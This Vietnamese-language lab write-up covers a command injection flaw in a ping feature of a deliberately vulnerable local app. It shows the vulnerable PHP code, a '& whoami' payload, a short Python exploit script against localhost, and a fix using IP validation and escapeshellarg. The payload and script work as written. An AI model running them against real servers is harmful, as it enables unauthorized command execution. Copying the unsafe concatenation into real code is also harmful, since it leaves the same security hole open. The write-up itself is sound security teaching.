1. Command Injection

URL: `http://127.0.0.1/OhMyCrab/modules/command_injection/ping.php`

Ứng dụng tồn tại lỗ hổng Command Injection do dữ liệu đầu vào từ tham số ip được nối trực tiếp vào câu lệnh hệ điều hành mà không thực hiện validate hoặc sanitize phù hợp. Attacker có thể chèn thêm OS command để thực thi lệnh tùy ý trên server.

PoC:

- Truy cập chức năng Ping Host.

<img width="607" height="481" alt="image" src="https://github.com/user-attachments/assets/18748dc8-eed6-4d46-98ef-c81fef065686" />

- Nhập payload: `& whoami`. Ứng dụng thực thi: `ping -n 1 & whoami`.

- Ứng dụng thực hiện ping sau đó tiếp tục thực thi lệnh whoami và trả về user đang chạy web server.

<img width="425" height="378" alt="image" src="https://github.com/user-attachments/assets/151d17cd-05e0-42b0-a124-5e5775e4f239" />

- Attacker có thể thực thi thêm nhiều command khác như: dir, type, ipconfig, systeminfo. Điều này cho phép attacker thực thi lệnh tùy ý trên server, thu thập thông tin hệ thống, đọc file nội bộ, v.v.

Phân tích source code

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $ip = $_POST['ip'];
        $cmd = "ping -n 1 " . $ip;
        $output = shell_exec($cmd);
    }
```

- Ứng dụng nhận dữ liệu từ input người dùng `$ip = $_POST['ip'];` sau đó nối trực tiếp vào OS command `$cmd = "ping -n 1 " . $ip;`.

- Giá trị $cmd được thực thi bởi `shell_exec($cmd);`.

- Do không validate input hoặc escape shell metacharacters, attacker có thể chèn thêm command thông qua các ký tự `&`, `&&`, `|`, `||`.

Cách khắc phục

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $ip = $_POST['ip'];
        // Validate IP
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            $output = "IP không hợp lệ";
        } else {
            $safe_ip = escapeshellarg($ip);
            $cmd = "ping -n 1 " . $safe_ip;
            $output = shell_exec($cmd);
        }
    }
```

- Sau khi khắc phục, ứng dụng kiểm tra dữ liệu có phải IP hợp lệ hay không `filter_var($ip, FILTER_VALIDATE_IP)`.

- Sử dụng `escapeshellarg()` để escape shell metacharacters trước khi truyền vào command.

Script khai thác

```
import requests
import re

url = "http://127.0.0.1/OhMyCrab/modules/command_injection/ping.php"

payload = "& whoami"

data = {
    "ip": payload
}

response = requests.post(
    url, data=data
)

match = re.search(r"<pre>(.*?)</pre>", response.text, re.S)
if match:
    output = match.group(1).strip()
    print("Kết quả command injection:")
    print(output)
else:
    print("Không tìm thấy output")
```

Script sử dụng thư viện requests để gửi payload command injection tới chức năng ping. Payload chèn command `whoami` nhằm kiểm tra khả năng thực thi lệnh hệ điều hành trên server.
